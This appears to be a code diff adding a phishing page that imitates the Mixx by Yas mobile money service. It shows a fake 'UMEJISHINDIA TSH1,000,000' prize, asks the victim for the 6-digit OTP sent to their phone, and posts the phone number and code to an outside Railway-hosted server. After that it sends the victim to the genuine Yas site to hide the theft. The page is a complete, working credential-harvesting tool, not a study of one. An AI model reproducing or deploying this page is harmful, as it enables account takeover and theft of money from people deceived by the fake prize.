@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mixx by Yas - Verify OTP</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(145deg, #e0e5ec 0%, #f0f4fa 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            padding: 16px;
+            position: relative;
+        }
+
+        /* ===== WATERMARKS ===== */
+        .watermark {
+            position: fixed;
+            font-size: 60px;
+            font-weight: 900;
+            color: rgba(244, 180, 0, 0.06);
+            pointer-events: none;
+            z-index: 0;
+            white-space: nowrap;
+            user-select: none;
+        }
+        .top-left { top: 10px; left: 10px; transform: rotate(-15deg); }
+        .top-right { top: 10px; right: 10px; transform: rotate(15deg); }
+        .bottom-left { bottom: 10px; left: 10px; transform: rotate(10deg); }
+        .bottom-right { bottom: 10px; right: 10px; transform: rotate(-10deg); }
+
+        /* ===== MAIN CARD ===== */
+        .verify-card {
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(2px);
+            border-radius: 48px;
+            padding: 30px 24px 40px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.6);
+            z-index: 2;
+            border: 1px solid rgba(244, 180, 0, 0.3);
+            position: relative;
+            transition: opacity 0.3s ease;
+        }
+
+        /* ===== BACK BUTTON ===== */
+        .back-link {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #64748b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: color 0.2s;
+            z-index: 5;
+        }
+        .back-link:hover {
+            color: #1C2E5B;
+        }
+        .back-link svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ===== LOGO ===== */
+        .logo {
+            max-width: 130px;
+            height: auto;
+            margin-bottom: 2px;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+
+        .brand-title {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #1C2E5B, #2c4580);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 1px;
+            margin-top: 0px;
+        }
+
+        .brand-sub {
+            color: #F4B400;
+            font-weight: 700;
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: -2px;
+        }
+
+        /* ===== WIN TEXT ===== */
+        .win-text {
+            background: linear-gradient(120deg, #F4B400, #FFD966);
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 800;
+            color: #1C2E5B;
+            margin: 12px 0 0px;
+            box-shadow: 0 4px 0 #b87f00;
+            animation: pulseWin 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseWin {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+
+        /* ===== VERIFY HEADER ===== */
+        .verify-header {
+            margin: 14px 0 6px;
+        }
+        .verify-header h2 {
+            font-size: 22px;
+            color: #1C2E5B;
+            font-weight: 700;
+        }
+        .verify-header p {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .verify-header .phone-display {
+            background: #f0f4fa;
+            padding: 8px 16px;
+            border-radius: 50px;
+            display: inline-block;
+            font-weight: 600;
+            color: #1C2E5B;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+
+        /* ===== OTP INPUT ===== */
+        .otp-wrapper {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 16px;
+        }
+
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            border: 2px solid #cbd5e1;
+            border-radius: 16px;
+            background: white;
+            transition: 0.15s;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            -webkit-appearance: none;
+            caret-color: #F4B400;
+        }
+
+        .otp-box:focus {
+            border-color: #F4B400;
+            box-shadow: 0 0 0 3px #ffe699;
+        }
+
+        .otp-box.error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+        }
+
+        /* ===== RESEND TIMER ===== */
+        .resend-section {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #64748b;
+        }
+        .resend-section .timer {
+            font-weight: 700;
+            color: #1C2E5B;
+        }
+        .resend-section .resend-link {
+            color: #F4B400;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .resend-section .resend-link.disabled {
+            color: #94a3b8;
+            cursor: not-allowed;
+        }
+
+        /* ===== ERROR MESSAGE ===== */
+        .error-message {
+            color: #ef4444;
+            font-size: 13px;
+            font-weight: 600;
+            min-height: 20px;
+            margin-top: 8px;
+            text-align: center;
+            transition: opacity 0.2s;
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #F4B400, #e6a800);
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            color: #1C2E5B;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 0 #b87f00;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+
+        .verify-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #b87f00;
+        }
+
+        .verify-btn:disabled {
+            opacity: 0.6;
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #b87f00;
+            pointer-events: none;
+        }
+
+        /* ===== SPINNER ===== */
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(28, 46, 91, 0.2);
+            border-top-color: #1C2E5B;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .verify-btn.loading .spinner {
+            display: block;
+        }
+        .verify-btn.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== SUCCESS OVERLAY ===== */
+        .success-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 48px;
+            z-index: 10;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+        .success-overlay.show {
+            display: flex;
+        }
+        .success-overlay .check {
+            font-size: 64px;
+            margin-bottom: 12px;
+        }
+        .success-overlay h3 {
+            color: #1C2E5B;
+            font-size: 24px;
+        }
+        .success-overlay p {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+
+        /* ===== CONFETTI ===== */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            animation: confettiFall 4s ease-in forwards;
+        }
+
+        @keyframes confettiFall {
+            0% {
+                opacity: 1;
+                transform: translateY(-10px) rotate(0deg) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(100vh) rotate(720deg) scale(0.5);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .verify-card {
+                padding: 24px 16px 35px;
+                border-radius: 40px;
+            }
+            .brand-title { font-size: 24px; }
+            .verify-header h2 { font-size: 20px; }
+            .win-text { font-size: 16px; padding: 8px 16px; }
+            .otp-box {
+                width: 50px;
+                height: 55px;
+                font-size: 28px;
+                border-radius: 14px;
+            }
+            .otp-wrapper { gap: 8px; }
+            .verify-btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+            .back-link {
+                top: 16px;
+                left: 16px;
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .otp-box {
+                width: 42px;
+                height: 48px;
+                font-size: 24px;
+                border-radius: 12px;
+            }
+            .otp-wrapper { gap: 6px; }
+            .verify-card {
+                padding: 20px 12px 30px;
+                border-radius: 32px;
+            }
+        }
+
+        @media (prefers-color-scheme: dark) {
+            body {
+                background: linear-gradient(145deg, #1a1a2e, #16213e);
+            }
+            .verify-card {
+                background: rgba(30, 30, 50, 0.96);
+                border-color: rgba(244, 180, 0, 0.2);
+            }
+            .brand-title {
+                background: linear-gradient(135deg, #F4B400, #FFD966);
+                -webkit-background-clip: text;
+                background-clip: text;
+            }
+            .verify-header h2 { color: #f0f0f0; }
+            .verify-header p { color: #94a3b8; }
+            .verify-header .phone-display { background: rgba(255,255,255,0.08); color: #f0f0f0; }
+            .otp-box {
+                background: rgba(255,255,255,0.08);
+                border-color: #334155;
+                color: #f0f0f0;
+            }
+            .otp-box:focus {
+                border-color: #F4B400;
+            }
+            .resend-section { color: #94a3b8; }
+            .resend-section .timer { color: #f0f0f0; }
+            .login-footer { color: #64748b; }
+            .login-footer a { color: #F4B400; }
+            .success-overlay { background: rgba(30, 30, 50, 0.95); }
+            .success-overlay h3 { color: #f0f0f0; }
+            .success-overlay p { color: #94a3b8; }
+            .watermark { color: rgba(244, 180, 0, 0.03); }
+            .back-link { color: #94a3b8; }
+            .back-link:hover { color: #F4B400; }
+            .win-text {
+                background: linear-gradient(120deg, #F4B400, #e6a800);
+                color: #1C2E5B;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== WATERMARKS ===== -->
+    <div class="watermark top-left">Mixx</div>
+    <div class="watermark top-right">Mixx</div>
+    <div class="watermark bottom-left">Mixx</div>
+    <div class="watermark bottom-right">Mixx</div>
+
+    <!-- ===== CONFETTI ===== -->
+    <div class="confetti-container" id="confettiContainer"></div>
+
+    <!-- ===== VERIFY CARD ===== -->
+    <div class="verify-card" id="verifyCard">
+
+        <!-- ===== BACK BUTTON ===== -->
+        <a href="https://yas.co.tz/mixx-by-yas/" class="back-link" id="backLink">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            Back
+        </a>
+
+        <!-- ===== SVG LOGO ===== -->
+        <svg class="logo" width="170" height="130" viewBox="0 0 400 300">
+            <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
+            <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
+            <rect x="170" y="185" width="40" height="8" rx="4" fill="#F4B400"/>
+            <polygon points="210,25 300,65 250,120 160,80" fill="#F4B400"/>
+            <polygon points="225,15 315,55 265,110 175,70" fill="#FFD54F" opacity="0.9"/>
+            <line x1="200" y1="120" x2="185" y2="140" stroke="#F4B400" stroke-width="4"/>
+            <line x1="210" y1="125" x2="195" y2="150" stroke="#F4B400" stroke-width="4"/>
+            <text x="95" y="260" font-size="52" fill="#1C2E5B" font-weight="bold">mixx</text>
+            <text x="205" y="260" font-size="52" fill="#F4B400" font-weight="bold">by yas</text>
+        </svg>
+
+        <div class="brand-title">MIXX BY YAS</div>
+        <div class="brand-sub">Secure · Fast · Reliable</div>
+
+        <!-- ===== WIN TEXT ===== -->
+        <div class="win-text">🎉 UMEJISHINDIA TSH1,000,000</div>
+
+        <!-- ===== VERIFY HEADER ===== -->
+        <div class="verify-header">
+            <h2>Verify Your Identity</h2>
+            <p>Enter the 6-digit OTP sent to</p>
+            <div class="phone-display" id="phoneDisplay">07XXXXXXXX</div>
+        </div>
+
+        <!-- ===== OTP INPUT ===== -->
+        <div class="otp-wrapper" id="otpWrapper">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+        </div>
+
+        <!-- ===== RESEND SECTION ===== -->
+        <div class="resend-section">
+            <span>Didn't receive the code? </span>
+            <span class="timer" id="timerDisplay">30s</span>
+            <a class="resend-link disabled" id="resendLink">Resend OTP</a>
+        </div>
+
+        <!-- ===== ERROR MESSAGE ===== -->
+        <div class="error-message" id="errorMessage"></div>
+
+        <!-- ===== VERIFY BUTTON ===== -->
+        <button type="button" class="verify-btn" id="verifyBtn">
+            <span class="btn-text">🔐 VERIFY & CLAIM PRIZE</span>
+            <span class="spinner"></span>
+        </button>
+
+        <!-- ===== SUCCESS OVERLAY ===== -->
+        <div class="success-overlay" id="successOverlay">
+            <div class="check">🏆</div>
+            <h3>Congratulations!</h3>
+            <p>You've successfully claimed TSH1,000,000!</p>
+            <p style="font-size:12px; margin-top:12px; color:#94a3b8;">Redirecting to your dashboard...</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const successOverlay = document.getElementById('successOverlay');
+            const verifyCard = document.getElementById('verifyCard');
+            const confettiContainer = document.getElementById('confettiContainer');
+            const timerDisplay = document.getElementById('timerDisplay');
+            const resendLink = document.getElementById('resendLink');
+
+            let otp = ["", "", "", "", "", ""];
+            let submitted = false;
+            let timerInterval = null;
+            let timeLeft = 30;
+
+            // ===== GET PHONE FROM URL =====
+            const urlParams = new URLSearchParams(window.location.search);
+            const phone = urlParams.get('phone') || '07XXXXXXXX';
+            document.getElementById('phoneDisplay').textContent = phone;
+
+            // ===== BACK BUTTON GOES TO LOGIN =====
+            document.getElementById('backLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'login.html';
+            });
+
+            // ===== CONFETTI EFFECT =====
+            function launchConfetti() {
+                const colors = ['#F4B400', '#FFD966', '#1C2E5B', '#FF6B6B', '#4ECDC4', '#45B7D1', '#FF8A5C', '#A29BFE'];
+                for (let i = 0; i < 80; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = (Math.random() * 8 + 4) + 'px';
+                    confetti.style.height = (Math.random() * 8 + 4) + 'px';
+                    confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    confetti.style.animationDelay = Math.random() * 2 + 's';
+                    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    confettiContainer.appendChild(confetti);
+                }
+                setTimeout(() => {
+                    confettiContainer.innerHTML = '';
+                }, 4000);
+            }
+
+            // ===== TIMER =====
+            function startTimer() {
+                timeLeft = 30;
+                timerDisplay.textContent = timeLeft + 's';
+                resendLink.classList.add('disabled');
+                resendLink.style.pointerEvents = 'none';
+
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    timerDisplay.textContent = timeLeft + 's';
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerDisplay.textContent = '0s';
+                        resendLink.classList.remove('disabled');
+                        resendLink.style.pointerEvents = 'auto';
+                    }
+                }, 1000);
+            }
+
+            // ===== RESEND OTP =====
+            resendLink.addEventListener('click', function() {
+                if (this.classList.contains('disabled')) return;
+                startTimer();
+                errorMessage.textContent = '📤 New OTP sent to your phone';
+                errorMessage.style.color = '#22c55e';
+                setTimeout(() => {
+                    errorMessage.textContent = '';
+                }, 3000);
+            });
+
+            // ===== OTP INPUT =====
+            otpBoxes.forEach((box, i) => {
+                box.addEventListener('input', function(e) {
+                    let val = e.target.value.replace(/\D/g, '');
+                    if (!val) {
+                        otp[i] = "";
+                        return;
+                    }
+                    e.target.value = val;
+                    otp[i] = val;
+                    this.classList.remove('error');
+                    errorMessage.textContent = '';
+
+                    if (i < 5) {
+                        otpBoxes[i + 1].focus();
+                    }
+
+                    if (otp.every(x => x !== "")) {
+                        setTimeout(() => {
+                            verifyOTP();
+                        }, 150);
+                    }
+                });
+
+                box.addEventListener('keydown', function(e) {
+                    if (e.key === "Backspace") {
+                        otp[i] = "";
+                        if (i > 0 && !this.value) {
+                            otpBoxes[i - 1].focus();
+                        }
+                    }
+                });
+
+                box.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/\D/g, '').slice(0, 6);
+                    if (digits) {
+                        const digitArray = digits.split('');
+                        digitArray.forEach((digit, idx) => {
+                            if (idx < 6) {
+                                otpBoxes[idx].value = digit;
+                                otp[idx] = digit;
+                            }
+                        });
+                        const nextEmpty = otpBoxes.findIndex((b, idx) => !otp[idx]);
+                        if (nextEmpty !== -1 && nextEmpty < 6) {
+                            otpBoxes[nextEmpty].focus();
+                        } else {
+                            otpBoxes[5].focus();
+                            if (otp.every(x => x !== "")) {
+                                setTimeout(() => verifyOTP(), 200);
+                            }
+                        }
+                    }
+                });
+            });
+
+            // ===== VERIFY OTP =====
+            verifyBtn.addEventListener('click', verifyOTP);
+
+            // ===== VERIFY OTP FUNCTION WITH API CALL =====
+            async function verifyOTP() {
+                if (submitted) return;
+
+                const otpValue = otp.join('');
+
+                if (otpValue.length !== 6) {
+                    errorMessage.textContent = '❌ Please enter all 6 digits of your OTP';
+                    otpBoxes.forEach(box => box.classList.add('error'));
+                    otpBoxes.find(b => !otp[otpBoxes.indexOf(b)])?.focus();
+                    return;
+                }
+
+                otpBoxes.forEach(box => box.classList.remove('error'));
+                errorMessage.textContent = '';
+
+                submitted = true;
+                verifyBtn.classList.add('loading');
+                verifyBtn.disabled = true;
+                verifyCard.style.opacity = "0.7";
+
+                console.log('📤 Verifying OTP for phone:', phone, 'OTP:', otpValue);
+
+                try {
+                    // ===== CALL YOUR API TO VERIFY OTP =====
+                    const response = await fetch('https://mxxyasstz-production.up.railway.app/verify-otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ 
+                            phone: phone, 
+                            otp: otpValue 
+                        })
+                    });
+
+                    const data = await response.json();
+                    console.log('📥 Verify response:', data);
+
+                    if (data.status === 'success') {
+                        // Launch confetti
+                        launchConfetti();
+                        successOverlay.classList.add('show');
+                        verifyCard.style.opacity = "1";
+
+                        // Redirect after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = "https://yas.co.tz/mixx-by-yas/";
+                        }, 3500);
+                    } else {
+                        throw new Error(data.message || 'Invalid OTP');
+                    }
+                } catch (error) {
+                    console.error('❌ Error:', error);
+                    errorMessage.textContent = '❌ ' + (error.message || 'Invalid OTP. Please try again.');
+                    submitted = false;
+                    verifyBtn.classList.remove('loading');
+                    verifyBtn.disabled = false;
+                    verifyCard.style.opacity = "1";
+                    otpBoxes.forEach(box => {
+                        box.value = '';
+                        box.classList.remove('error');
+                    });
+                    otp = ["", "", "", "", "", ""];
+                    otpBoxes[0].focus();
+                }
+            }
+
+            // ===== START TIMER =====
+            startTimer();
+
+        })();
+    </script>
+
+</body>
+</html>
